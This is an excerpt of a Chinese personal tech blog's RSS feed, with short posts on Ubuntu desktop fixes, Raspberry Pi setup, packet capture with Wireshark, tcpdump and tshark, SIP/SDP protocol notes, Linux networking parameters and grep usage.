WINE_CMD=&amp;#34;LC_ALL=zh_CN.UTF-8 deepin-wine&amp;#34; 参考 https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu
2. ubuntu 20.04 wine 微信 qq 截图时黑屏 之前截图都是好的的，不知道为什么，今天截图时，点击了微信的截图按钮后，屏幕除了状态栏，都变成黑色的了。
各种搜索引擎搜了一遍，没有发现解决方案。
最后决定思考最近对系统做了什么变更，最近我好像给系统安装了新的主题，然后在登录时，选择了新的主题，而没有选择默认的ubuntu主题。
在登录界面的右下角，有个按钮，点击之后，可以选择主题。
最近我都是选择其他的主题，没有选择默认的ubuntu主题，然后我就注销之后，重新在登录时选择默认的ubuntu主题后，再次打开微信截图，功能恢复正常。
所以说，既然选择ubuntu了，就没必要搞些花里胡哨的东西。ubuntu默认的主题挺好看的，而且支持自带主题的设置，就没必要再折腾了。
3. [open] ubuntu 20.04 锁屏后 解锁屏幕非常慢 super + l可以用来锁屏，锁屏之后屏幕变成黑屏。
黑屏之后，如果需要唤醒屏幕，可以随便在键盘上按键，去唤醒屏幕。但是这个唤醒的过程感觉很慢，基本上要随便按键接近十几秒，屏幕才能被点亮，网上搜了下，但是没有找到原因。
但是有个解决办法，就是在黑屏状态下，不要随便输入，而要输入正确的密码，然后按回车键， 这样会快很多。
也就是说，系统运行正常，可能是显示器的问题。
4. ubuntu 20.04 xorg 高cpu 桌面卡死 sudo systemctl restart gdm 5. ubuntu 状态栏显示网速 sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor sudo apt-get install indicator-sysmonitor 在任务启动中选择System Monitor
在配置中可以选择开机启动
在高级中可以设置显示哪些列， 我只关系网速，所以只写了{net}
6. 在命令行查看图片 实际上终端并不能显示图片，而是调用了外部的程序取显示图片。
eog 是 Eye Of Gnome 的缩写， 它其实是个图片查看器。</description>
    </item>
    
    <item>
      <title>树莓派初始化配置</title>
      <link>https://wdd.js.org/posts/2022/raspi-config/</link>
      <pubDate>Tue, 25 Oct 2022 12:12:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/raspi-config/</guid>
      <description>我已经装过几次树莓派的系统了，记录一些使用心得。
1. 选择哪个版本 最好用无桌面版，无桌面版更加稳定。我之前用过几次桌面版，桌面版存在以下问题。
使用偶尔感觉会卡 经常使用一天之后，第二天要重启系统。 2. 关于初始设置 默认的用户是 pi，默认的密码是raspberry 登录成功之后，sudo passwd pi 来修改pi用户的密码 登录之后，sudo passwd root 来设置root的用户密码 3. 开启ssh 远程登录服务 raspi-config 4. root用户ssh登录 默认树莓派是禁止使用root远程登录的，想要开启的话，需要编辑/etc/ssh/sshd_config文件，增加一行PermitRootLogin yes, 然后重启ssh服务
vi /etc/ssh/sshd_config PermitRootLogin yes sudo systemctl restart ssh // chong 5. 关于联网 联网有两个方案
用网线连接，简单方便，但是有条线子，总会把桌面搞得很乱 使用wifi连接，简单方便 使用wifi连接，一种方式是编辑配置文件，这个比较麻烦。我建议使用树莓派提供的raspi-config命令来设置wifi。
在命令行中输入：raspi-config, 可以看到如下界面
按下箭头，选择NetWork Options，按回车确认 进入网络设置后，按下箭头，选择N2 Wi-fi 然后就很简单了，输入wifi名称和wifi密码，最好你的wifi名称是英文的，出现中文会很尴尬的。 6. 如何找到树莓派的IP地址 某些情况下，树莓派在断电重启之后会获得新的IP地址。在没有显示器的情况下，如果找到树莓派的IP呢？
树莓派的MAC地址是：b8:27:eb:6c 开头
所以你只需要输入: arp -a 就会打印网络中的主机以及MAC地址，找以b8:e7:eb:6c开头的，很可能就是树莓派。
7. 设置清华镜像源 https://mirrors.tuna.tsinghua.edu.cn/help/raspbian/</description>
    </item>
    
    <item>
      <title>utimer task &lt;tm-utimer&gt; already scheduled</title>
      <link>https://wdd.js.org/opensips/utime-task-scheduled/</link>
      <pubDate>Tue, 25 Oct 2022 12:06:54 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/utime-task-scheduled/</guid>
      <description>可能和avp_db_query有关 https://opensips.org/pipermail/users/2018-October/040157.html What we found is that the warning go away if we comment out the single avp_db_query that is being used in our config.
_ The avp_db_query is not executed at the start, but only when specific header is present. Yet the fooding start immediately after opensips start. The mere presence of the avp_db_query function in config without execution is enough to have the issue._
可能和openssl库有关 https://github.com/OpenSIPS/opensips/issues/1771#issuecomment-517744489 ere are your results.</description>
    </item>
    
    <item>
      <title>Wireshark抓包教程</title>
      <link>https://wdd.js.org/network/wireshark/</link>
      <pubDate>Tue, 25 Oct 2022 09:12:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/wireshark/</guid>
      <description>1. HTTP抓包例子 案例：本地向 http://192.168.40.134:31204/some-api，如何过滤？
http and ip.addr == 192.168.40.134 and tcp.port == 31204 语句分析：
http 表示我只需要http的包 ip.addr 表示只要源ip或者目标ip地址中包含192.168.40.134 tcp.port 表示只要源端口或者目标端口中包含31204 2. 为什么我写的表达式总是不对呢？😂 很多时候，你写的表达式背景色变成红色，说明表达式错误了，例如下图：http and ip.port == 31204
写出ip.port这个语句，往往是对传输协议理解不清晰。😅
ip是网络层的协议，port是传输层tcp或者udp中使用的。例如你写tcp.port == 80，udp.port ==3000这样是没问题的。但是port不能跟在ip的后面，如果你不清楚怎么写，你可以选择wireshark的智能提示。
智能提示会提示所有可用的表达式。
3. 常用过滤表达式 一般我们的过滤都是基于协议，ip地址或者端口号进行过滤的，
3.1. 基于协议的过滤 直接输入协议名进行过滤
3.2. 基于IP地址的过滤 3.3. 基于端口的过滤 基于端口的过滤一般就两种
tcp.port == xxx udp.port == xxx 3.4. 基于host的过滤 4. 比较运算符支持 == 等于 != 不等于 &amp;gt; 大于 &amp;lt; 小于 &amp;gt;= 大于等于 &amp;lt;= 小于等于 ip.addr == 192.168.2.4 5. 逻辑运算符 and 条件与 or 条件或 xor 仅能有一个条件为真 not 所有条件都不能为真 ip.</description>
    </item>
    
    <item>
      <title>Tcpdump抓包教程</title>
      <link>https://wdd.js.org/network/tcpdump/</link>
      <pubDate>Tue, 25 Oct 2022 09:09:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/tcpdump/</guid>
      <description>查看帮助文档 从帮助文档可以看出，包过滤的表达式一定要放在最后一个参数
tcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ] [ -c count ] [ --count ] [ -C file_size ] [ -E spi@ipaddr algo:secret,... ] [ -F file ] [ -G rotate_seconds ] [ -i interface ] [ --immediate-mode ] [ -j tstamp_type ] [ -m module ] [ -M secret ] [ --number ] [ --print ] [ -Q in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ --version ] [ -V file ] [ -w file ] [ -W filecount ] [ -y datalinktype ] [ -z postrotate-command ] [ -Z user ] [ --time-stamp-precision=tstamp_precision ] [ --micro ] [ --nano ] [ expression ] 列出所有网卡 tcpdump -D 1.</description>
    </item>
    
    <item>
      <title>http抓包工具httpry使用</title>
      <link>https://wdd.js.org/network/httpry/</link>
      <pubDate>Tue, 25 Oct 2022 09:07:04 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/httpry/</guid>
      <description>git clone https://gitee.com/nuannuande/httpry.git cd httpry yum install libpcap-devel -y make make install cp -f httpry /usr/sbin/ httpry -i eth0 </description>
    </item>
    
    <item>
      <title>SIP和SDP的关系</title>
      <link>https://wdd.js.org/opensips/sip-with-sdp/</link>
      <pubDate>Sat, 03 Sep 2022 20:36:45 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/sip-with-sdp/</guid>
      <description>1. 什么是SDP? SDP是Session Description Protocol的缩写，翻译过来就是会话描述协议，这个协议通常存储各种和媒体相关的信息，例如支持哪些媒体编码, 媒体端口是多少？媒体IP地址是多少之类的。
SDP一般作为SIP消息的body部分。如下所示
INVITE sip:bob@biloxi.example.com SIP/2.0 Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74bf9 Max-Forwards: 70 From: Alice &amp;lt;sip:alice@atlanta.example.com&amp;gt;;tag=9fxced76sl To: Bob &amp;lt;sip:bob@biloxi.example.com&amp;gt; Call-ID: 3848276298220188511@atlanta.example.com CSeq: 1 INVITE Contact: &amp;lt;sip:alice@client.atlanta.example.com;transport=tcp&amp;gt; Content-Type: application/sdp Content-Length: 151 v=0 o=alice 2890844526 2890844526 IN IP4 client.atlanta.example.com s=- c=IN IP4 192.0.2.101 t=0 0 m=audio 49172 RTP/AVP 0 a=rtpmap:0 PCMU/8000 刚开始我一直认为某些sip消息一定带有sdp，例如invite消息。某些sip请求一定没有携带sdp。
实际上sip消息和sdp并没有硬性的附属关系。sip是用来传输信令的，sdp是用来描述媒体流信息的。
如果信令不需要携带媒体流信息，就可以不用携带sdp。
一般情况下，invite请求都会带有sdp信息，但是某些时候也会没有。例如3PCC(third party call control), 第三方呼叫控制，是指由第三方负责协商媒体信息。
常见的一个场景
2. SDP字段介绍 2.1. v= 版本号 当前sdp的版本号是0，所以常见的都是v=0
2.2. o= 发起者id o=的格式</description>
    </item>
    
    <item>
      <title>SIP协议拾遗补缺</title>
      <link>https://wdd.js.org/opensips/sip-notes/</link>
      <pubDate>Sat, 03 Sep 2022 15:54:57 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/sip-notes/</guid>
      <description>1. sip协议由request-uri路由，而不是to字段 sip消息再经过ua发送出去时，request-uri可能会被重写，而to字段，一般是不变的
2. 主叫生成callId和from tag, 响应to tag由另一方生成 totag的作用可以用来区分初始化请求和序列化请求
3. sip消息有哪些头字段是必须的？ Via Max-Forwards (请求消息必须有这个头，响应消息一般没有这个头) 感谢 @genmzy 提示。 From To Call-ID CSeq 4. 被叫在向主叫发消息时，from和to字段为什么没变？ from和to字段用来表名sip 请求的方向，而不是sip消息的方向。主叫发起的请求，那么在这个dialog中，所有的sip消息，主叫和被叫字段都不会变。
5. 为什么所有via头中的branch都以z9hG4bK开头 这个头是rfc3261中规定的，表示她是经过严格规则生成的，可以用来标记事务。
6. sip有两种url, 是什么？有什么区别 用户uri: AOR address of record, 例如from和to字段中的url 设备uri: 例如 contact头 用户uri用来唯一认证用户，设备uri用来唯一认证设备。 用户uri往往需要查询数据库，而设备uri来自设备自己的网络地址，不需要查询数据库。 一个用户可能有多个设备 7. sip注册实际上绑定用户url和设备ip地址 我并不能直接联系你，我只能用我的手机拨打你的手机。
8. 呼叫结束了，为什么呼叫的状态信息还需要维持一段时间？ 重传的invite消息，可能包含相同的callI和cseq, 为了影响到之后的呼叫，需要耗尽网络中重传的包。
9. sip 网关是干什么的？ 网关的两侧通信协议是不同的，网关负责将协议翻译成彼此可以理解的协议。sip网关也是如此。电话网络的通信协议不仅仅只有sip， 还有其他的各种信令，如七号信令，ISDN, ISUP, CAS等。
10. sip结构组件 SIP User Agents Presence Agents B2B User Agents SIp Gateways SIP Server 代理服务器 注册服务器 重定向服务器 11.</description>
    </item>
    
    <item>
      <title>Trunk Pbx Gateway</title>
      <link>https://wdd.js.org/opensips/trunk-pbx-gateway/</link>
      <pubDate>Sat, 03 Sep 2022 15:24:44 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/trunk-pbx-gateway/</guid>
      <description>传统中继 sip trunk中继 安全可靠：SIP Trunk设备和ITSP之间只需建立唯一的、安全的、具有QoS保证的SIP Trunk链路。通过该链路来承载企业的多路并发呼叫，运营商只需对该链路进行鉴权，不再对承载于该链路上的每一路SIP呼叫进行鉴权。 节约硬件成本：企业内部通信由企业IP-PBX负责。企业所有外出通信都通过SIP Trunk交由ITSP，再由ITSP中的设备发送到PSTN网络，企业不再需要维护原有的传统PSTN中继链路，节省了硬件和维护成本。 节约话费成本：企业可以通过设置目的地址任意选择并连接到多个ITSP，充分利用遍布全球各地的ITSP，节省通话费用。 功能强大：部署SIP Trunk设备后，全网可以使用SIP协议，可以更好的支持语音、会议、即时消息等IP通信业务。 处理信令和媒体：SIP Trunk设备不同于SIP代理服务器。SIP Trunk设备接收到用户的呼叫请求后，会代表用户向ITSP发起新呼叫请求。在转发过程中，SIP Trunk设备不但要对信令消息进行中继转发，对RTP媒体消息也需要进行中继转发。在整个过程中，SIP Trunk设备两端的设备（企业内部和企业外部设备）均认为和其交互的是SIP Trunk设备本身。 参考 http://www.h3c.com/cn/d_201009/688762_30003_0.htm https://getvoip.com/blog/2013/01/24/differences-between-sip-trunking-and-hosted-pbx/ https://www.onsip.com/blog/hosted-pbx-vs-sip-trunking https://baike.baidu.com/item/sip%20trunk/1499860 </description>
    </item>
    
    <item>
      <title>Path头简史</title>
      <link>https://wdd.js.org/opensips/sip-path/</link>
      <pubDate>Sat, 03 Sep 2022 14:51:32 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/sip-path/</guid>
      <description>RFC3261并没有介绍关于Path头的定义，因为这个头是在RFC3327中定义的，Path头作为一个SIP的扩展头。
RFC3327的标题是：Session Initiation Protocol (SIP) Extension Header Field for Registering Non-Adjacent Contacts。
从这个标题可以看出，Path头是作为Register请求的一个消息头，一般这个头只在注册消息上才有。
这个头的格式如下。
Path: &amp;lt;sip:P1.EXAMPLEVISITED.COM;lr&amp;gt; 从功能上说，Path头和record-route头的功能非常相似，但是也不同。
看下面的一个场景，uac通过p1和p2, 将注册请求发送到uas, 在某一时刻，uac作为被叫，INVITE请求要从uas发送到uac, 这时候，INVITE请求应该怎么走？
假如我们希望INVITE请求要经过p2,p2,然后再发送到uac, Path头的作用就是这个。
注册请求经过P1时，P1在注册消息上加上p1地址的path头 注册请求经过P2时，P2在注册消息上加上p2地址的path头 注册请求到达uas时，uas从Contact头上获取到uac的地址信息，然后从两个Path头上获取到如下信息：如果要打电话给uac, Path头会转变为route头，用来定义INVITE请求的路径。 简单定义：Path头用来一般在注册消息里，Path头定义了uac作为被叫时，INVITE请求的发送路径。
参考 </description>
    </item>
    
    <item>
      <title>Hugo Timezone没有设置， 导致页面无法渲染</title>
      <link>https://wdd.js.org/posts/2022/hugo-timezone/</link>
      <pubDate>Sat, 03 Sep 2022 10:20:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2022/hugo-timezone/</guid>
      <description>写好了博客，但是没有在网页上渲染出来，岂不是很气人！
我的archtypes/default.md配置如下
--- title: &amp;#34;{{ replace .Name &amp;#34;-&amp;#34; &amp;#34; &amp;#34; | title }}&amp;#34; date: &amp;#34;{{ now.Format &amp;#34;2006-01-02 15:04:05&amp;#34; }}&amp;#34; draft: false --- 当使用 hugo new 创建一个文章的时候，有如下的头
--- title: &amp;#34;01: 学习建议&amp;#34; date: &amp;#34;2022-09-03 10:23:10&amp;#34; draft: false --- Hugo 默认采用的是 格林尼治平时 (GMT)，比北京时间 (UTC+8) 晚了 8 个小时，Hugo 在生成静态页面的时候，不会生成超过当前时间的文章。
如果把北京时间当作格林尼治时间来计算，那么肯定还没有超过当前时间。
所以我们要给站点设置时区。
在config.yaml增加如下内容
timeZone: &amp;#34;Asia/Shanghai&amp;#34; </description>
    </item>
    
    <item>
      <title>Via route Record-Route的区别</title>
      <link>https://wdd.js.org/opensips/via-route-record-route/</link>
      <pubDate>Sat, 03 Sep 2022 02:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/via-route-record-route/</guid>
      <description>sequenceDiagram title French Words I Know autonumber participant a participant p1 participant p2 participant p3 participant b a-&gt;&gt;p1 : INVITE route: p1, via: a p1-&gt;&gt;p2: INVITE via: a,p1, rr: p1 p2-&gt;&gt;p3: INVITE via: a,p1,p2 rr: p1,p2 p3-&gt;&gt;b: INVITE via: a,p1,p2,p3 rr: p1,p2,p3 b--&gt;&gt;p3: 180 via: a,p1,p2,p3 rr: p1,p2,p3 p3--&gt;&gt;p2: 180 via: a,p1,p2 rr: p1,p2,p3 p2--&gt;&gt;p1: 180 via: a,p1 rr: p1,p2,p3 p1--&gt;&gt;a: 180 via: a rr: p1,p2,p3 b--&gt;&gt;p3: 200 OK via: a,p1,p2,p3 rr: p1,p2,p3 p3--&gt;&gt;p2: 200 Ok via: a,p1,p2 rr: p1,p2,p3 p2--&gt;&gt;p1: 200 Ok via: a,p1 rr: p1,p2,p3 p1--&gt;&gt;a: 200 Ok via: a rr: p1,p2,p3 a-&gt;&gt;p1 : ACK via: a, route: p1,p2,p3 p1-&gt;&gt;p2: ACK via: a,p1, route: p2,p3 p2-&gt;&gt;p3: ACK via: a,p1,p2 route: p3 p3-&gt;&gt;b: ACK via: a,p1,p2,p3 rr代表record-route头。</description>
    </item>
    
    <item>
      <title>SIP协议简介</title>
      <link>https://wdd.js.org/opensips/sip-overview/</link>
      <pubDate>Fri, 02 Sep 2022 01:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/sip-overview/</guid>
      <description>SIP是VoIP的基石，相当于HTTP协议在Web服务器里的角色。如果你熟悉HTTP协议，那么你可以在SIP协议中找到许多和HTTP中熟悉的东西，例如请求头，请求体，响应码之类概念，这是因为SIP协议的设计，很大程度上参考了HTTP协议。
如果想要学习VoIP，那么SIP协议是你务必掌握敲门砖。
1. SIP组件 UAC: 例如sip终端，软电话，话机 UAS: sip服务器 UA: ua既可以当做uac也可以当做uas 代理服务器 重定向服务器 注册服务器 网关 PSTN 公共交换电话网 2. SBC 边界会话控制器 SBC是Session Border Controller的缩写，具有一下几个功能。
拓扑隐藏：隐藏所有内部网络的信息。 媒体流管理：设置语音流编码规则，转换等 增加能力：例如Refer, 3CPP 维护NAT映射： 访问控制 媒体加密：例如外部网络用SRTP, 内部网络用RTP 3. sip注册过程 下面简化注册逻辑，省略了验证和过期等字段：
对于分机来说，注册服务器的地址是需要设置的 分机向注册服务器发请求，说：你好，注册服务器，我是8005，我的地址是200.180.1.1，以后你可以用这个地址联系我。 注册服务器回复：好的，注册成功 4. sip服务器的类型 4.1. 代理服务器 4.2. 重定向服务器 4.3. 背靠背UA服务器 背靠背UA服务器有两个作用
隐藏网络拓扑结构 有些时候，路由无法到达，只能用背靠背UA服务器 5. 常用sip请求方法 比较常用的是下面的
常用的几个是：register, invite, ack, bye, cancel。除了cancel和ack不需要认证外，其余的请求都需要认证。 register自不必说，invite和bye是需要认证的。
对于我们不信任的ua，我们不允许他们呼叫。对于未认证的bye，也需要禁止。后者可以防止恶意的bye请求，挂断正常的呼叫。
invite除了re-invite的情况，其余的都属于初始化请求，需要着重关心的。而对于bye这种序列化请求，只需要按照record-route去路由。
6. sip响应状态码 7. sip对话流程图 从上图可以看出，从invite请求到200ok之间的信令，都经过了代理服务器。但是200ok之后的ack，确没有经过代理服务器，如果想要所有信令都经过代理服务器，需要在sip消息头record-routing 指定代理服务器的地址
8. 请求与响应报文 9. 事务与对话的区别 重点：
从INVITE请求到最终的响应（注意1xx不是最终响应，非1xx的都是最终响应）之间，称为事务。一个事务可以带有多个消息组成，并经过多个ua。 ack请求比较特殊，但是ack不是事务。如果被叫接通后，超时未收到主叫方的ack, 会怎样？是否会再次发送200OK tcp三次握手建立连接，sip：invite-&amp;gt;200ok-&amp;gt;ack，可以理解为三次握手建立对话。 bye请求和200ok算作一个事务 dialog建立的前提是呼叫接通，如果呼叫没有接通，则没有dialog。 dialog可以由三个元素唯一确定。callId, from字段中的tag, to字段中的tag。 10.</description>
    </item>
    
    <item>
      <title>学习建议</title>
      <link>https://wdd.js.org/opensips/study-tips/</link>
      <pubDate>Fri, 02 Sep 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/opensips/study-tips/</guid>
      <description>1. 概念理解 务必要能理解SIP的重要概念，特别是事务、Dialog。参考https://www.yuque.com/wangdd/opensips/fx5pyy 概念是非常重要的东西，不理解概念，越学就会越吃力 2. 时序图 时序图是非常重要的，培训时，一般我会要求学员务必能够手工绘制时序图。因为只有能够手工绘制时序图了，在排查问题时，才能够从抓包工具给出的时序图中分析出问题所在。
RFC3665 https://datatracker.ietf.org/doc/html/rfc3665 中提供了很多经典的时序图，建议可以去临摹。</description>
    </item>
    
    <item>
      <title>Tshark入门到精通</title>
      <link>https://wdd.js.org/network/tshark/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/tshark/</guid>
      <description>1. 使用摘要 一个命令的使用摘要非常重要，摘要里包含了这个工具最常用的用法。
要注意的是，如果要用过滤器，一定要放到最后。
tshark [ -i &amp;lt;capture interface&amp;gt;|- ] [ -f &amp;lt;capture filter&amp;gt; ] [ -2 ] [ -r &amp;lt;infile&amp;gt; ] [ -w &amp;lt;outfile&amp;gt;|- ] [ options ] [ &amp;lt;filter&amp;gt; ] tshark -G [ &amp;lt;report type&amp;gt; ] [ --elastic-mapping-filter &amp;lt;protocols&amp;gt; ] 2. 为什么要学习tshark? 一般情况下，我们可能会在服务端用tcpdump抓包，然后把包拿下来，用wireshark分析。那么我们为什么要学习tshark呢？
相比于wireshark， tshark有以下的优点
速度飞快：wireshark在加载包的时候，tshark可能已经给出了结果。 更稳定：wireshark在处理包的时候，常常容易崩溃 更适合做文本处理：tshark的输出是文本，这个文本很容易被awk, sort, uniq等等命令处理 但是我不建议上来就学习，更建议在熟悉wireshark之后，再去进一步学习tshark
3. 使用场景 3.1 基本场景 用wireshark最基本的场景的把pcap文件拖动到wireshark中，然后可能加入一些过滤条件。
tshark -r demo.pcap tshark -r demo.pcap -c 1 # 只读一个包就停止 输出的列分别为：序号，相对时间，绝对时间，源ip, 源端口，目标ip, 目标端口</description>
    </item>
    
    <item>
      <title>Udp Checksum Offload</title>
      <link>https://wdd.js.org/network/udp-checksum-offload/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/udp-checksum-offload/</guid>
      <description>在服务端抓包，然后在wireshark上分析，发现wireshark提示：udp checksum字段有问题
checksum 0x&amp;hellip; incrorect should be 0x.. (maybe caused by udp checksum offload)
以前我从未遇到过udp checksum的问题。所以这次是第一次遇到，所以需要学习一下。 首先udp checksum是什么？
我们看下udp的协议组成的字段，其中就有16位的校验和
校验和一般都是为了检验数据包在传输过程中是否出现变动的。
如果接受端收到的udp消息校验和错误，将会被悄悄的丢弃 udp校验和是一个端到端的校验和。端到端意味它不会在中间网络设备上校验。 校验和由发送方负责计算，接收端负责验证。目的是为了发现udp首部和和数据在发送端和接受端之间是否发生了变动 udp校验和是可选的功能，但是总是应该被默认启用。 如果发送方设置了udp校验和，则接受方必须验证 发送方负责计算？具体是谁负责计算
计算一般都是CPU的工作，但是有些网卡也是支持checksum offload的。
所谓offload, 是指本来可以由cpu计算的，改变由网卡硬件负责计算。 这样做有很多好处，
可以降低cpu的负载，提高系统的性能 网卡的硬件checksum, 效率更高 为什么只有发送方出现udp checksum 错误？ 我在接受方和放松方都进行了抓包，一个比较特殊的特征是，只有发送方发现了udp checksum的错误，在接受方，同样的包，udp checksum的值却是正确的。
一句话的解释：tcpdump在接收方抓到的包，本身checksum字段还没有被计算，在后续的步骤，这个包才会被交给NIC, NIC来负责计算。
结论 maybe caused by udp checksum offload 这个报错并没有什么问题。
参考 ● 《tcp/ip 详解》 ● https://www.kernel.org/doc/html/latest/networking/checksum-offloads.html ● https://dominikrys.com/posts/disable-udp-checksum-validation/ ● https://sokratisg.net/2012/04/01/udp-tcp-checksum-errors-from-tcpdump-nic-hardware-offloading/</description>
    </item>
    
    <item>
      <title>Wireshark 附带的19命令行程序</title>
      <link>https://wdd.js.org/network/wireshark-extra-cli/</link>
      <pubDate>Thu, 30 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/wireshark-extra-cli/</guid>
      <description>大多数时候我们都是图形界面的方式使用wireshak, 其实一般只要你安装了wireshark，同时也附带安装了一些命令行工具。 这些工具也可以极大的提高生产效率。 本文只是对工具的功能简介，可以使用命令 -h, 查看命令的具体使用文档。
1. editcap 编辑抓包文件 Editcap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Edit and/or translate the format of capture files. 举例: 按照时间范围从input.pcap文件中拿出指定时间范围的包
editcap -A &amp;#39;2014-12-10 10:11:01&amp;#39; -B &amp;#39;2014-12-10 10:21:01&amp;#39; input.pcap output.pcap 2. androiddump 这个命令似乎可以用来对安卓系统进行抓包，没玩过安卓，不再多说。
Wireshark - androiddump v1.1.0 Usage: androiddump --extcap-interfaces [--adb-server-ip=&amp;lt;arg&amp;gt;] [--adb-server-tcp-port=&amp;lt;arg&amp;gt;] androiddump --extcap-interface=INTERFACE --extcap-dlts androiddump --extcap-interface=INTERFACE --extcap-config androiddump --extcap-interface=INTERFACE --fifo=PATH_FILENAME --capture 3. ciscodump 似乎是对思科的网络进行抓包的，没用过 Wireshark - ciscodump v1.0.0 Usage: ciscodump &amp;ndash;extcap-interfaces ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;extcap-dlts ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;extcap-config ciscodump &amp;ndash;extcap-interface=ciscodump &amp;ndash;remote-host myhost &amp;ndash;remote-port 22222 &amp;ndash;remote-username myuser &amp;ndash;remote-interface gigabit0/0 &amp;ndash;fifo=FILENAME &amp;ndash;capture</description>
    </item>
    
    <item>
      <title>Linux内核参数rp_filter</title>
      <link>https://wdd.js.org/network/rp_filter/</link>
      <pubDate>Mon, 13 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/network/rp_filter/</guid>
      <description>问题现象 主机上有两个网卡ens192和ens224。ens129网卡是对内网络的网卡，ens224是对网网络的网卡。
SIP信令阶段都是正常的，但是发现，对于来自node3的RTP流， 并没有从ens192网卡转发给node1上。
sequenceDiagram title network autonumber node1-&gt;&gt;ens192: INVITE ens224-&gt;&gt;node2: INVITE node2-&gt;&gt;ens224: 200 ok ens192-&gt;&gt;node1: 200 ok node1-&gt;&gt;ens192: ACK ens224-&gt;&gt;node2: ACK node1--&gt;&gt;ens192: RTP out ens224--&gt;&gt;node3: RTP out node3--&gt;&gt;ens224: RTP in 抓包程序抓到了node3发送到ens224上的包，但是排查应用服务器的日志发现，似乎应用服务器根本没有收到node3上过来的包, 所以也就无法转发。
因而怀疑是不是在内核上被拦截了。 后来通过将rp_filter设置为0, 然后语音流的转发就正常了。
事后复盘 node3的这个IP直接往应用服务器上发包，可能会被拦截。因为在信令建立的阶段，应用服务器并没有主动发
在kernel文档上 rp_filter - INTEGER 0 - No source validation. 1 - Strict mode as defined in RFC3704 Strict Reverse Path Each incoming packet is tested against the FIB and if the interface is not the best reverse path the packet check will fail.</description>
    </item>
    
    <item>
      <title>grep常用参考</title>
      <link>https://wdd.js.org/shell/grep-docs/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/grep-docs/</guid>
      <description>1. grep 常用参数 参考： GNU Grep 3.0
--color:高亮显示匹配到的字符串 -v：显示不能被pattern匹配到的 -i：忽略字符大小写 -o：仅显示匹配到的字符串 -q：静默模式，不输出任何信息 -A#：after，匹配到的后#行 -B#：before，匹配到的前#行 -C#：context，匹配到的前后各#行 -E：使用ERE，支持使用扩展的正则表达式 －c：只输出匹配行的计数。 －I：不区分大 小写(只适用于单字符)。 －h：查询多文件时不显示文件名。 －l：查询多文件时只输出包含匹配字符的文件名。 －n：显示匹配行及 行号。 - m: 匹配多少个关键词之后就停止搜索 －s：不显示不存在或无匹配文本的错误信息。 －v：显示不包含匹配文本的所有行。 2. 普通：搜索trace.log 中含有ERROR字段的日志 grep ERROR trace.log 3. 输出文件：可以将日志输出文件中 grep ERROR trace.log &amp;gt; error.log 4. 反向：搜索不包含ERROR字段的日志 grep -v ERROR trace.log 5. 向前：搜索包含ERROR,并且显示ERROR前10行的日志 grep -B 10 ERROR trace.log 6. 向后：搜索包含ERROR字段，并且显示ERROR后10行的日志 grep -A 10 ERROR trace.log 7. 上下文：搜索包含ERROR字段，并且显示ERROR字段前后10行的日志 grep -C 10 ERROR trace.log 8. 多字段：搜索包含ERROR和DEBUG字段的日志 gerp -E &amp;#39;ERROR|DEBUG&amp;#39; trace.</description>
    </item>
    
    <item>
      <title>Shell 书籍和资料收藏</title>
      <link>https://wdd.js.org/shell/star-collect/</link>
      <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
      
      <guid>https://wdd.js.org/shell/star-collect/</guid>
      <description>shell 自动化测试 https://github.com/bats-core/bats-core shell精进 https://github.com/NARKOZ/hacker-scripts https://github.com/trimstray/the-book-of-secret-knowledge https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing https://github.com/dylanaraps/pure-bash-bible https://github.com/dylanaraps/pure-sh-bible https://github.com/Idnan/bash-guide https://github.com/denysdovhan/bash-handbook https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html https://github.com/jlevy/the-art-of-command-line https://google.github.io/styleguide/shell.xml https://wiki.bash-hackers.org/start https://linuxguideandhints.com/ 安全加固 https://www.lisenet.com/2017/centos-7-server-hardening-guide/ https://highon.coffee/blog/security-harden-centos-7/ https://github.com/trimstray/the-practical-linux-hardening-guide https://github.com/decalage2/awesome-security-hardening https://www.hackingarticles.in/ https://github.com/toniblyx/my-arsenal-of-aws-security-tools </description>
    </item>
    
    <item>
      <title>WebRTC 人声检测与舒适噪音</title>
      <link>https://wdd.js.org/freeswitch/webrtc-vad-cng/</link>
      <pubDate>Wed, 01 Jun 2022 08:27:53 +0800</pubDate>
      
      <guid>https://wdd.js.org/freeswitch/webrtc-vad-cng/</guid>
      <description>人声检测 VAD 人声检测(VAD: Voice Activity Detection)是区分语音中是人说话的声音，还是其他例如环境音的一种功能。
除此以外，人声检测还能用于减少网络中语音包传输的数据量，从而极大的降低语音的带宽，极限情况下能降低50%的带宽。
在一个通话中，一般都是只有一个人说话，另一人听。很少可能是两个人都说话的。
例如A在说话的时候，B可能在等待。
